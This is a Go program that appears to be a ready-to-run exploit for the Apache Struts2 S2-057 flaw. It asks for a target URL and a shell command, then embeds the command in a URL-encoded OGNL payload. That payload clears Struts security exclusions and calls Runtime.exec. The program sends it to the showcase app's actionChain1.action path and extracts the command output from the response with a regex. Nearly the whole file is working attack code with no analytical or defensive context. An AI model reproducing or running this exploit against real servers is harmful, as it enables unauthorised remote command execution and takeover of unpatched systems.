package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
)

func main() {
	fmt.Println("[*] s2-057 test starting")

	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url: ")
	url1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}

	reader2 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input command: ")
	cmd, _, err := reader2.ReadLine()
	if err != nil {
		panic(err)
	}

	url2 := string(url1) + "/struts2-showcase/" + "%24%7B%0A(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('" + string(cmd) + "')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D" + "/actionChain1.action"
	// fmt.Println(url2)
	var client http.Client

	req1, err := http.NewRequest("GET", url2, nil)
	if err != nil {
		panic(err)
	}
	req1.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0")
	req1.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req1.Header.Add("Referer", "http://192.168.1.120:8080/actionchaining/register2.action")
	req1.Header.Add("Connection", "close")
	req1.Header.Add("Cookie", "JSESSIONID=E49B8C52DCAEE830CAC1C88F5999284E")
	req1.Header.Add("Upgrade-Insecure-Requests", "1")
	req1.Header.Add("Cache-Control", "max-age=0")

	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}

	fmt.Println(rep1.Status)
	body1, err := ioutil.ReadAll(rep1.Body)
	if err != nil {
		panic(err)
	}
	reg1 := regexp.MustCompile(` {1,20}(.*)href(.*)viewSource().*a>`)
	str1 := reg1.FindAllString(string(body1), -1)
	reg2 := regexp.MustCompile(`struts2-showcase(.*) /`)
	str2 := reg2.FindAllString(str1[0], -1)
	str3 := strings.Split(str2[0], "struts2-showcase")
	fmt.Println(str3)
}
